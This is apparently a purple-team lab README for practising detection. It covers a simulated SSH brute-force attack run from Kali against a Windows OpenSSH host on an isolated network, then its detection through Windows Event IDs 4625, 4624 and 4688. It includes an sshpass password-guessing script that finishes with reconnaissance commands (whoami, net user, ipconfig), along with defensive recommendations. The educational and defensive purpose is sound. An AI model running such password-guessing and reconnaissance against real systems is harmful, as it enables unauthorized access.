# purple-team-labs
SSH BRUTE FORCE ATTACK - CROSS-PLATFORM DETECTION LAB

OVERVIEW

This lab demonstrates a simulated SSH brute force attack against a Windows 
system running OpenSSH server. The attack is launched from a Kali Linux 
attacker machine, and detection is demonstrated from both the attacker's 
perspective and the victim's perspective.

This is an educational lab designed for authorized security testing only.

---

WHAT THIS LAB TEACHES

✅ ATTACK SIMULATION
- How brute force attacks work
- SSH protocol exploitation
- Post-compromise reconnaissance

✅ LOG ANALYSIS
- Windows Event Viewer (Event IDs 4625, 4624, 4688)
- Linux journalctl logging
- Cross-platform correlation

✅ INCIDENT DETECTION
- Identifying brute force patterns
- Detecting successful compromises
- Tracking attacker commands

✅ SECURITY CONCEPTS
- Authentication mechanisms
- Access control
- Audit logging

---

LAB SETUP REQUIREMENTS

HARDWARE REQUIREMENTS
- Host machine with minimum 8GB RAM
- 20GB free disk space for VMs

SOFTWARE REQUIREMENTS
- VMware Workstation/Fusion
- Windows 11 (or Windows 10) VM
- Kali Linux VM
- OpenSSH Server (Windows)

NETWORK CONFIGURATION
- Host-only network between VMs
- Windows IP: 192.168.56.102
- Kali IP: 192.168.56.103
- Firewall rules allowing SSH (port 22)

---

LAB ARCHITECTURE

┌─────────────────────────────────────────┐
│         HOST MACHINE                    │
│  (Your Laptop/Desktop)                  │
└──────────────────┬──────────────────────┘
                   │
        Host-Only Network (192.168.56.0/24)
                   │
        ┌──────────┴──────────┐
        │                     │
   ┌────▼─────┐          ┌───▼──────┐
   │ Windows  │          │  Kali    │
   │ 192.168. │          │ 192.168. │
   │ 56.102   │◄─SSH─────│ 56.103   │
   │ (Victim) │          │(Attacker)│
   └──────────┘          └──────────┘
   - OpenSSH Server      - SSH Client
   - Event Logging       - sshpass tool

---

STEP-BY-STEP LAB INSTRUCTIONS

PREREQUISITES

1. WINDOWS VM SETUP
   - Install OpenSSH Server
   - Create user account (e.g., vbox)
   - Set password for user account
   - Enable Windows Security Event Logging (Event ID 4625, 4624, 4688)
   - Configure firewall to allow SSH

2. KALI VM SETUP
   - Install sshpass tool
   - sudo apt update
   - sudo apt install sshpass -y
   - Verify SSH client is available
   - ssh -v -V

3. NETWORK CONNECTIVITY
   - Verify Kali can ping Windows
   - ping -c 4 192.168.56.102
   - Verify SSH port is open
   - nmap -p 22 192.168.56.102

---

STEP 1: PREPARE LAB ENVIRONMENT

ON WINDOWS:
# Open Event Viewer
eventvwr.msc

# Navigate to: Windows Logs → Security
# Right-click → Clear Log
# This gives us a fresh baseline

ON KALI:
# Create lab directory
mkdir -p ~/purple_team_lab/ssh_brute_force_lab
cd ~/purple_team_lab/ssh_brute_force_lab

# Clear command history
history -c

---

STEP 2: CREATE ATTACK SIMULATION SCRIPT

ON KALI:
cat > ssh_brute_force_simulation.sh << 'EOF'
#!/bin/bash

LOG_FILE="ssh_attack_log.txt"
TARGET_IP="192.168.56.102"
TARGET_USER="vbox"
TARGET_PASSWORD="[YOUR_PASSWORD]"

echo "=== SSH Brute Force Simulation ===" > $LOG_FILE
echo "Target: $TARGET_USER@$TARGET_IP" >> $LOG_FILE
echo "Start Time: $(date '+%Y-%m-%d %H:%M:%S')" >> $LOG_FILE
echo "" >> $LOG_FILE

# 5 failed attempts with wrong passwords
echo "[INFO] Starting brute force attempts..." >> $LOG_FILE
for i in {1..5}; do
  TIMESTAMP=$(date '+%H:%M:%S')
  echo "[$TIMESTAMP] Attempt $i: sshpass -p 'wrongpass$i' ssh -l $TARGET_USER $TARGET_IP 'exit'" >> $LOG_FILE
  sshpass -p "wrongpass$i" ssh -l $TARGET_USER $TARGET_IP "exit" 2>&1 | grep -i "permission\|denied" >> $LOG_FILE
  echo "Result: Failed" >> $LOG_FILE
  sleep 2
done

echo "" >> $LOG_FILE
echo "[INFO] Attempting successful login with correct password..." >> $LOG_FILE
TIMESTAMP=$(date '+%H:%M:%S')
echo "[$TIMESTAMP] Attempt 6 (SUCCESSFUL): Executing reconnaissance..." >> $LOG_FILE

# Successful login with reconnaissance
sshpass -p "$TARGET_PASSWORD" ssh -l $TARGET_USER $TARGET_IP "whoami" >> $LOG_FILE 2>&1
sleep 1
sshpass -p "$TARGET_PASSWORD" ssh -l $TARGET_USER $TARGET_IP "net user" >> $LOG_FILE 2>&1
sleep 1
sshpass -p "$TARGET_PASSWORD" ssh -l $TARGET_USER $TARGET_IP "ipconfig" >> $LOG_FILE 2>&1

echo "" >> $LOG_FILE
echo "End Time: $(date '+%Y-%m-%d %H:%M:%S')" >> $LOG_FILE
echo "[INFO] Simulation complete. Check ssh_attack_log.txt for results."
EOF

chmod +x ssh_brute_force_simulation.sh

Replace [YOUR_PASSWORD] with the actual Windows vbox password.

---

STEP 3: EXECUTE ATTACK SIMULATION

ON KALI:
./ssh_brute_force_simulation.sh
cat ssh_attack_log.txt

---

STEP 4: CAPTURE ATTACKER LOGS

ON KALI:
# Save command history
history | grep ssh > ssh_command_history.txt

# Verify log files created
ls -la
cat ssh_attack_log.txt
cat ssh_command_history.txt

---

STEP 5: CAPTURE VICTIM LOGS

ON WINDOWS (PowerShell as Administrator):
# Export security events
wevtutil qe Security /f:text > C:\windows_security_events.txt

# Or export specific event IDs:
wevtutil qe Security /q:"Event[System[EventID=4625 or EventID=4624 or EventID=4688]]" /f:text > C:\windows_events_filtered.txt

ON WINDOWS (Event Viewer GUI - Alternative):
1. Open Event Viewer
2. Navigate to Windows Logs → Security
3. Filter for Event IDs: 4625, 4624, 4688
4. Right-click → Save All Events As
5. Save as XML file

---

STEP 6: ANALYZE RESULTS

ON KALI:
# View attack log
cat ssh_attack_log.txt

# Expected output should show:
# - 5 failed attempts (Permission denied)
# - 1 successful attempt
# - 3 reconnaissance command outputs

ON WINDOWS (Event Viewer):
1. Filter for Event ID 4625
   - Should see 5 failed login events
   - All from IP 192.168.56.103
   - All for account vbox

2. Filter for Event ID 4624
   - Should see 1 successful login event
   - From IP 192.168.56.103
   - Account vbox

3. Filter for Event ID 4688
   - Should see 3 process creation events
   - Commands: whoami, net user, ipconfig
   - Creator: sshd.exe

---

STEP 7: DOCUMENT FINDINGS

Use the included SSH_Brute_Force_Lab_Report.md template to document:
- Attack timeline
- Log analysis
- Detection indicators
- Recommendations

---

LAB RESULTS

WHAT YOU SHOULD OBSERVE

Metric                          Expected Result
Failed login attempts (4625)    5 events
Successful login (4624)         1 event
Process executions (4688)       3 events
Attack duration                 ~15-20 seconds
Total events generated          9+ security events

KEY OBSERVATIONS

✓ BRUTE FORCE DETECTION
- Multiple 4625 events in rapid succession
- Same source IP
- Same target account
- Clear pattern of password guessing

✓ COMPROMISE CONFIRMATION
- 4624 event immediately after failed attempts
- Successful authentication
- Same source IP and account

✓ POST-COMPROMISE ACTIVITY
- 4688 events immediately after 4624
- Reconnaissance commands executed
- Commands: whoami, net user, ipconfig

---

LEARNING OUTCOMES

After completing this lab, you should understand:

TECHNICAL SKILLS
✓ How to simulate SSH attacks
✓ How to read Windows Security Event Logs
✓ How to correlate attacker and victim logs
✓ How to identify brute force patterns
✓ How to track post-compromise activity

SECURITY CONCEPTS
✓ Attack lifecycle (reconnaissance → access → post-compromise)
✓ Logging and audit trail importance
✓ Cross-platform incident analysis
✓ Detection indicators and IOCs
✓ Recommended security controls

PROFESSIONAL SKILLS
✓ Lab documentation
✓ Incident report writing
✓ Technical analysis
✓ Evidence preservation

---

SECURITY RECOMMENDATIONS

Based on this lab, apply these controls:

IMMEDIATE (Do Today)
[ ] Enable account lockout after 5 failed attempts
[ ] Reset compromised account password
[ ] Block attacker IP at firewall
[ ] Review all account activity

SHORT-TERM (This Week)
[ ] Implement multi-factor authentication
[ ] Disable password-based SSH authentication
[ ] Enable SSH key-based authentication only
[ ] Configure centralized log collection

LONG-TERM (This Month+)
[ ] Deploy intrusion detection system
[ ] Implement security information & event management (SIEM)
[ ] Establish incident response procedures
[ ] Conduct regular penetration testing

---

TOOLS USED

Tool            Purpose                         System
sshpass         Automated SSH password entry    Kali
ssh             SSH client                      Kali
Event Viewer    Windows log analysis            Windows
wevtutil        Windows event export            Windows
journalctl      Linux log viewing               Kali
bash            Shell scripting                 Kali

---

IMPORTANT NOTES

⚠️ This lab should only be run in:
✓ Personal lab environments
✓ Authorized penetration testing
✓ Educational settings with permission
✓ Isolated networks with no internet

❌ Do NOT use against:
✗ Systems you don't own
✗ Production environments
✗ Systems without written authorization
✗ Public networks or the internet

Unauthorized access to computer systems is illegal.

---

TROUBLESHOOTING

ISSUE: SSH connection times out
SOLUTION:
- Verify firewall rule allows port 22
- Check SSH service is running on Windows
- Verify IP addresses are correct (192.168.56.102)

ISSUE: sshpass command not found
SOLUTION:
sudo apt update
sudo apt install sshpass -y

ISSUE: Event ID 4688 not showing
SOLUTION:
# Enable process creation auditing
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Restart Windows
shutdown /r /t 30

ISSUE: Script won't execute
SOLUTION:
# Make script executable
chmod +x ssh_brute_force_simulation.sh

# Run with bash explicitly
bash ssh_brute_force_simulation.sh

---

NEXT STEPS

After completing this lab:

1. MODIFY THE ATTACK:
   - Try different usernames
   - Try different password lists
   - Vary timing between attempts

2. ENHANCE DETECTION:
   - Create custom Event Viewer filters
   - Write PowerShell scripts to analyze logs
   - Build timeline visualization

3. BUILD ON IT:
   - Add privilege escalation simulation
   - Add lateral movement simulation
   - Add data exfiltration simulation

4. ADVANCED TOPICS:
   - Log tampering and detection
   - Attacker obfuscation techniques
   - Advanced persistence mechanisms

---

RESOURCES

DOCUMENTATION
- Microsoft Event ID 4625
- Microsoft Event ID 4624
- Microsoft Event ID 4688
- OpenSSH Documentation

RELATED LABS
- Phase 2A: Windows Log Analysis
- Phase 3: Attack Simulation
- Phase 4: Detection Rules

---

AUTHOR NOTES

This lab was designed to bridge the gap between theoretical security 
knowledge and practical hands-on skills. By simulating an attack and 
analyzing logs from both perspectives, learners develop critical thinking 
skills for real-world incident response.

The cross-platform approach is particularly valuable for Purple Team 
professionals who need to understand both attacker and defender perspectives.

---

LICENSE

Educational use only. For authorized security testing purposes.

---

VERSION HISTORY

Version    Date           Changes
1.0        2026-10-30     Initial lab creation
1.1        2026-10-31     Added troubleshooting section

---

FEEDBACK

For questions, improvements, or suggestions:
- Update this lab based on your experience
- Share your findings
- Contribute enhancements

---

Happy learning! This is real cybersecurity work. 🚀
